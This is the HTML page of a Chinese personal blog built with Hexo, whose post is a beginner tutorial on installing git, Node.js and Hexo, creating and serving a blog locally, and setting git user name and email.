  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/" rel="tag">Linux</a></li></ul>


    </footer>

  </div>

  

  
  
  

  

</article>
    
    <article id="post-简单搭建个属于你的个人博客" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/02/18/%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BA%E4%B8%AA%E5%B1%9E%E4%BA%8E%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"
    >简单搭建个属于你的个人博客</a
  >
</h2>
  

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/02/18/%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BA%E4%B8%AA%E5%B1%9E%E4%BA%8E%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/" class="article-date">
  <time datetime="2020-02-18T14:44:57.000Z" itemprop="datePublished">2020-02-18</time>
</a>
      
      
      
      
    </div>
    

    

    
    <div class="article-entry" itemprop="articleBody">
      


      

      
      <hr>
<p>没想到都大三老狗了，还是个新人的水准，这就是菜吧。但还是要努力学习呀，希望有个好的结果！</p>
<p>废话不多说，开始小白的搭建博客教程吧~</p>
<h4 id="1-安装git"><a href="#1-安装git" class="headerlink" title="1.安装git"></a>1.安装git</h4><p><a href="https://git-scm.com/downloads" target="_blank" rel="noopener">git官网传送门</a></p>
<h4 id="2-安装Node-js"><a href="#2-安装Node-js" class="headerlink" title="2.安装Node.js"></a>2.安装Node.js</h4><p><a href="https://nodejs.org/en/" target="_blank" rel="noopener">Node.js官网传送门</a></p>
<h4 id="3-安装Hexo"><a href="#3-安装Hexo" class="headerlink" title="3.安装Hexo"></a>3.安装Hexo</h4><p>Hexo拥有丰富的主题，比较推荐</p>
<p>win+R  cmd 输入以下命令，安装hexo包</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo</span><br></pre></td></tr></table></figure>

<h4 id="4-建立博客所在文件"><a href="#4-建立博客所在文件" class="headerlink" title="4.建立博客所在文件"></a>4.建立博客所在文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo init chj</span><br><span class="line">cd chj</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure>

<p>过程如下图：</p>
<p><img src="/2020/02/18/%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BA%E4%B8%AA%E5%B1%9E%E4%BA%8E%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/1.png" alt="1234"></p>
<p>文件下的目录如下：</p>
<p><img src="/2020/02/18/%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BA%E4%B8%AA%E5%B1%9E%E4%BA%8E%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/cmd.jpg" alt="1234"></p>
<h4 id="config-yml"><a href="#config-yml" class="headerlink" title="_config.yml"></a>_config.yml</h4><p>这是网站的配值信息，可以在此配置大部分的参数。</p>
<h4 id="source"><a href="#source" class="headerlink" title="source"></a>source</h4><p>这是存放用户资源的地方，文章会存放在其中的_posts文件夹下，而一些标签、归档则是在source文件夹下。</p>
<h4 id="themes"><a href="#themes" class="headerlink" title="themes"></a>themes</h4><p>主题文件夹，Hexo 会根据主题来生成静态页面，博客所用的各种主题都存放在此目录下。</p>
<h4 id="5-git的基本操作"><a href="#5-git的基本操作" class="headerlink" title="5.git的基本操作"></a>5.git的基本操作</h4><p>安装上诉步骤简单部署好以后，输入以下命令，然后本地localhost:4000访问，就可以看到自己的博客了~</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/18/%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BA%E4%B8%AA%E5%B1%9E%E4%BA%8E%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/4000.png" alt="1234"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global user.name &quot;Your Name&quot;</span><br><span class="line">$ git config --global user.email &quot;email@example.com&quot;</span><br></pre></td></tr></table></figure>

<p>因为Git是分布式版本控制系统，所以，每个机器都必须自报家门：你的名字和Email地址。你也许会担心，如果有人故意冒充别人怎么办？这个不必担心，首先我们相信大家都是善良无知的群众，其次，真的有冒充的也是有办法可查的。</p>
<p>注意<code>git config</code>命令的<code>--global</code>参数，用了这个参数，表示你这台机器上所有的Git仓库都会使用这个配置，当然也可以对某个仓库指定不同的用户名和Email地址。</p>

      
      <!-- reward -->
      
    </div>
    
    
      <!-- copyright -->
      
    <footer class="article-footer">
      
      

    </footer>

  </div>

  

  
  
  

  

</article>
    
  </article>
  

  
  <nav class="page-nav">
    
    <a class="extend prev" rel="prev" href="/">上一页</a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
  </nav>
  
</section>
</div>

      <footer class="footer">
  <div class="outer">
    <ul class="list-inline">
      <li>
        &copy;
        2020
        0Rld
      </li>
      <li>
        
          Powered by
        
        
        <a href="https://hexo.io" target="_blank">Hexo</a> Theme <a href="https://github.com/Shen-Yu/hexo-theme-ayer" target="_blank">Ayer</a>
        
      </li>
    </ul>
    <ul class="list-inline">
      <li>
        
        
        <span>
  <i>PV:<span id="busuanzi_value_page_pv"></span></i>
  <i>UV:<span id="busuanzi_value_site_uv"></span></i>
</span>
        
      </li>
      <li>
        <!-- cnzz统计 -->
        
        <script type="text/javascript" src=''></script>
        
      </li>
    </ul>
  </div>
</footer>
    <div class="to_top">
        <div class="totop" id="totop">
  <i class="ri-arrow-up-line"></i>
</div>
      </div>
    </main>
      <aside class="sidebar">
        <button class="navbar-toggle"></button>
<nav class="navbar">
  
  <div class="logo">
    <a href="/"><img src="/images/1.jpg" alt="0Rld"></a>
  </div>
  
  <ul class="nav nav-main">
    
    <li class="nav-item">
      <a class="nav-item-link" href="/">主页</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/archives">归档</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/categories">分类</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/tags">标签</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/2020/about">About</a>
    </li>
    
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      
      <a class="nav-item-link nav-item-search"  title="Search">
        <i class="ri-search-line"></i>
      </a>
      
      
      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
        <i class="ri-rss-line"></i>
      </a>
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
      </aside>
      <div id="mask"></div>

<!-- #reward -->
<div id="reward">
  <span class="close"><i class="ri-close-line"></i></span>
  <p class="reward-p"><i class="ri-cup-line"></i>Buy me a cup of coffee~</p>
  <div class="reward-box">
    
    <div class="reward-item">
      <img class="reward-img" src="/images/alipay.jpg">
      <span class="reward-type">支付宝</span>
    </div>
    
    
    <div class="reward-item">
      <img class="reward-img" src="/images/wechat.jpg">
      <span class="reward-type">微信</span>
    </div>
    
  </div>
</div>
      
<script src="/js/jquery-2.0.3.min.js"></script>


<script src="/js/jquery.justifiedGallery.min.js"></script>


<script src="/js/lazyload.min.js"></script>


<script src="/js/busuanzi-2.3.pure.min.js"></script>


<script src="/js/share.js"></script>



<script src="/fancybox/jquery.fancybox.min.js"></script>




<script>
  try {
    var typed = new Typed("#subtitle", {
    strings: ['四季更替，梦境更迭','生活,旅行,思考,代码,博客','努力一定会有所获！'],
    startDelay: 0,
    typeSpeed: 200,
    loop: true,
    backSpeed: 100,
    showCursor: true
    });
  } catch (err) {
  }
  
</script>




<script>
  var ayerConfig = {
    mathjax: true
  }
</script>


<script src="/js/ayer.js"></script>


<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">


<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css">
<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>

<script>
    function viewer_init() {
        let pswpElement = document.querySelectorAll('.pswp')[0];
        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))

        $imgArr.forEach(($em, i) => {
            $em.onclick = () => {
                // slider展开状态
                // todo: 这样不好，后面改成状态
                if (document.querySelector('.left-col.show')) return
                let items = []
                $imgArr.forEach(($em2, i2) => {
                    let img = $em2.getAttribute('data-idx', i2)
                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
                    let title = $em2.getAttribute('alt')
                    // 获得原图尺寸
                    const image = new Image()
                    image.src = src
                    items.push({
                        src: src,
                        w: image.width || $em2.width,
                        h: image.height || $em2.height,
                        title: title
                    })
                })
                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
                    index: parseInt(i)
                });
                gallery.init()
            }
        })
    }
    viewer_init()
</script>



<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
      tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
          processEscapes: true,
          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
  });

  MathJax.Hub.Queue(function() {
      var all = MathJax.Hub.getAllJax(), i;
      for(i=0; i < all.length; i += 1) {
          all[i].SourceElement().parentNode.className += ' has-jax';
      }
  });
</script>

<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.6/unpacked/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>


<script type="text/javascript" src="https://js.users.51.la/20544303.js"></script>
  </div>
</body>

</html>